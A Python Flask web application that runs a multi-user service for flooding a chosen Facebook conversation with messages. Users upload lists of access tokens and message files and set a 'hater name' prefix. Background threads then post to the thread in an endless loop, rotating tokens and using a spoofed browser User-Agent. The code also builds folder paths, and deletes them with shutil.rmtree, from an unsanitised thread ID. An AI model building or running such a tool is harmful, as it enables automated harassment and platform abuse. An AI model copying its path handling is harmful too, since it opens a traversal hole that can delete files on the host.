from flask import Flask, request, render_template, redirect, url_for, session, jsonify
import requests
import time
import os
import json
import threading
from werkzeug.security import generate_password_hash, check_password_hash
import shutil

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'your-secret-key-here')  # Use env var for security
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # Limit uploads to 16 MB

# Headers for Facebook Graph API
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

# File paths
USERS_FILE = 'users.json'
SERVERS_FILE = 'servers.json'
MAX_SERVERS_PER_USER = 3  # Limit for free plan

# Thread-safe storage for active servers
active_servers = {}
file_lock = threading.Lock()  # Simple lock for JSON file operations

# Load JSON file with locking
def load_json(file_path, default={}):
    with file_lock:
        if os.path.exists(file_path):
            with open(file_path, 'r') as f:
                return json.load(f)
    return default

# Save JSON file with locking
def save_json(file_path, data):
    with file_lock:
        with open(file_path, 'w') as f:
            json.dump(data, f, indent=4)

# Load and save users
load_users = lambda: load_json(USERS_FILE)
save_users = lambda users: save_json(USERS_FILE, users)

# Load and save servers
load_servers = lambda: load_json(SERVERS_FILE)
save_servers = lambda servers: save_json(SERVERS_FILE, servers)

# Server messaging function with file-based logging
def run_server(server_id, thread_id, access_tokens, messages, hater_name, speed):
    post_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
    num_comments = len(messages)
    max_tokens = len(access_tokens)
    message_index = 0
    log_file_path = os.path.join(f"Convo_{thread_id}", "server.log")

    while active_servers.get(server_id, {}).get('running', False):
        try:
            token_index = message_index % max_tokens
            access_token = access_tokens[token_index]
            message = messages[message_index].strip()
            parameters = {'access_token': access_token, 'message': f"{hater_name} {message}"}
            response = requests.post(post_url, json=parameters, headers=headers)
            current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
            log_message = (
                f"[+] SEND SUCCESSFUL No. {message_index + 1} Thread ID {thread_id} Token No. {token_index + 1}: {hater_name} {message}\n"
                f"Time: {current_time}\n\n"
            ) if response.ok else (
                f"[x] Failed to send Comment No. {message_index + 1} Thread ID {thread_id} Token No. {token_index + 1}: {hater_name} {message}\n"
                f"Time: {current_time}\n\n"
            )
            with open(log_file_path, "a") as log_file:
                log_file.write(log_message)
            message_index = (message_index + 1) % num_comments
            time.sleep(speed)
        except requests.exceptions.RequestException as e:
            current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
            log_message = f"[!] Request Error: {str(e)}\nTime: {current_time}\n\n"
            with open(log_file_path, "a") as log_file:
                log_file.write(log_message)
            time.sleep(30)

# Home page (dashboard)
@app.route('/')
def index():
    if 'email' not in session:
        return redirect(url_for('login'))
    servers = load_servers()
    user_servers = {sid: s for sid, s in servers.items() if s['user_email'] == session['email']}
    error = request.args.get('error')  # Get error from query params if any
    return render_template('index.html', servers=user_servers, email=session['email'], error=error)

# Signup route
@app.route('/signup', methods=['GET', 'POST'])
def signup():
    if request.method == 'POST':
        full_name = request.form.get('full_name')
        email = request.form.get('email')
        password = request.form.get('password')
        users = load_users()
        if email in users:
            return render_template('signup.html', error='Email already exists')
        users[email] = {'full_name': full_name, 'password': generate_password_hash(password)}
        save_users(users)
        session['email'] = email
        return redirect(url_for('index'))
    return render_template('signup.html')

# Login route
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        users = load_users()
        if email in users and check_password_hash(users[email]['password'], password):
            session['email'] = email
            return redirect(url_for('index'))
        return render_template('login.html', error='Invalid email or password')
    return render_template('login.html')

# Logout route
@app.route('/logout')
def logout():
    session.pop('email', None)
    return redirect(url_for('login'))

# Create server route
@app.route('/create_server', methods=['GET', 'POST'])
def create_server():
    if 'email' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        servers = load_servers()
        user_servers = [s for s in servers.values() if s['user_email'] == session['email']]
        if len(user_servers) >= MAX_SERVERS_PER_USER:
            return render_template('create_server.html', error=f'Maximum of {MAX_SERVERS_PER_USER} servers reached')

        thread_id = request.form.get('threadId')
        hater_name = request.form.get('kidx')
        time_interval = int(request.form.get('time'))
        txt_file = request.files['txtFile']
        access_tokens = txt_file.read().decode().splitlines()
        messages_file = request.files['messagesFile']
        messages = messages_file.read().decode().splitlines()

        folder_name = f"Convo_{thread_id}"
        os.makedirs(folder_name, exist_ok=True)
        with open(os.path.join(folder_name, "CONVO.txt"), "w") as f:
            f.write(thread_id)
        with open(os.path.join(folder_name, "token.txt"), "w") as f:
            f.write("\n".join(access_tokens))
        with open(os.path.join(folder_name, "haters.txt"), "w") as f:
            f.write(hater_name)
        with open(os.path.join(folder_name, "time.txt"), "w") as f:
            f.write(str(time_interval))
        with open(os.path.join(folder_name, "message.txt"), "w") as f:
            f.write("\n".join(messages))
        with open(os.path.join(folder_name, "np.txt"), "w") as f:
            f.write("NP")

        server_id = str(len(servers) + 1)
        servers[server_id] = {
            'thread_id': thread_id,
            'hater_name': hater_name,
            'time_interval': time_interval,
            'access_tokens': access_tokens,
            'messages': messages,
            'running': False,
            'user_email': session['email']
        }
        save_servers(servers)
        return redirect(url_for('index'))
    return render_template('create_server.html')

# Start server route
@app.route('/start_server/<server_id>')
def start_server(server_id):
    if 'email' not in session:
        return redirect(url_for('login'))
    servers = load_servers()
    if server_id in servers and servers[server_id]['user_email'] == session['email']:
        if not servers[server_id].get('running', False):
            servers[server_id]['running'] = True
            save_servers(servers)
            server_thread = threading.Thread(target=run_server, args=(
                server_id,
                servers[server_id]['thread_id'],
                servers[server_id]['access_tokens'],
                servers[server_id]['messages'],
                servers[server_id]['hater_name'],
                servers[server_id]['time_interval']
            ))
            active_servers[server_id] = {'thread': server_thread, 'running': True}
            server_thread.start()
    else:
        return redirect(url_for('index', error='Unauthorized access'))
    return redirect(url_for('index'))

# Stop server route
@app.route('/stop_server/<server_id>')
def stop_server(server_id):
    if 'email' not in session:
        return redirect(url_for('login'))
    servers = load_servers()
    if server_id in servers and servers[server_id]['user_email'] == session['email']:
        if servers[server_id].get('running', False):
            servers[server_id]['running'] = False
            save_servers(servers)
            active_servers[server_id]['running'] = False
    else:
        return redirect(url_for('index', error='Unauthorized access'))
    return redirect(url_for('index'))

# View server logs route
@app.route('/view_logs/<server_id>')
def view_logs(server_id):
    if 'email' not in session:
        return redirect(url_for('login'))
    servers = load_servers()
    if server_id in servers and servers[server_id]['user_email'] == session['email']:
        thread_id = servers[server_id]['thread_id']
        log_file_path = os.path.join(f"Convo_{thread_id}", "server.log")
        logs = []
        if os.path.exists(log_file_path):
            with open(log_file_path, "r") as log_file:
                logs = log_file.readlines()
        error = request.args.get('error')  # Get error from query params if any
        return render_template('view_logs.html', server_id=server_id, logs=logs, error=error)
    else:
        return redirect(url_for('index', error='Unauthorized access'))

# Delete server route
@app.route('/delete_server/<server_id>')
def delete_server(server_id):
    if 'email' not in session:
        return redirect(url_for('login'))
    servers = load_servers()
    if server_id in servers and servers[server_id]['user_email'] == session['email']:
        if servers[server_id].get('running', False):
            servers[server_id]['running'] = False
            if server_id in active_servers:
                active_servers[server_id]['running'] = False
        thread_id = servers[server_id]['thread_id']
        del servers[server_id]
        save_servers(servers)
        if server_id in active_servers:
            del active_servers[server_id]
        folder_name = f"Convo_{thread_id}"
        if os.path.exists(folder_name):
            shutil.rmtree(folder_name)
    else:
        return redirect(url_for('index', error='Unauthorized access'))
    return redirect(url_for('index'))

# Restart running servers on app startup
def restart_running_servers():
    servers = load_servers()
    for server_id, server in servers.items():
        if server.get('running', False):
            server_thread = threading.Thread(target=run_server, args=(
                server_id,
                server['thread_id'],
                server['access_tokens'],
                server['messages'],
                server['hater_name'],
                server['time_interval']
            ))
            active_servers[server_id] = {'thread': server_thread, 'running': True}
            server_thread.start()

if __name__ == '__main__':
    restart_running_servers()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)  # Disable debug for production
